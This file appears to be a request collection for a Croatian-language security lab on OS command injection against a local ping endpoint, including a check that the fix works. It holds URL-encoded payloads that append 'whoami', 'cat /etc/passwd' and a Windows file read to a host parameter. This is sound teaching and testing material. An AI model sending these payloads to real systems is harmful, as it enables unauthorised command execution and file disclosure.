@@ -1,0 +1,24 @@
+### =====================================================================
+### Lab09 – A05 Injection: OS command injection (CWE-78)
+### Upute: docs/labs/lab09-command-injection.md
+### Napomena: %20 = razmak, %26 = &, %3B = ;
+### =====================================================================
+@host = http://localhost:5080
+
+### 1) Legitimno: ping lokalnog računala
+GET {{host}}/api/lab09/ping?host=127.0.0.1
+
+### 2) NAPAD (Windows i Linux/macOS):  127.0.0.1 & whoami
+GET {{host}}/api/lab09/ping?host=127.0.0.1%20%26%20whoami
+
+### 3) NAPAD (Windows):  127.0.0.1 & type C:\Windows\win.ini
+GET {{host}}/api/lab09/ping?host=127.0.0.1%20%26%20type%20C%3A%5CWindows%5Cwin.ini
+
+### 4) NAPAD (Linux/macOS):  127.0.0.1; cat /etc/passwd
+GET {{host}}/api/lab09/ping?host=127.0.0.1%3B%20cat%20%2Fetc%2Fpasswd
+
+### 5) Bezopasni dokaz izvršavanja (isti payload koristi sigurnosni test):  127.0.0.1 & echo PWNED_LAB09
+GET {{host}}/api/lab09/ping?host=127.0.0.1%20%26%20echo%20PWNED_LAB09
+
+### 6) PROVJERA POPRAVKA: 2)–5) vraćaju 400, a 1) i ime hosta i dalje rade
+GET {{host}}/api/lab09/ping?host=localhost
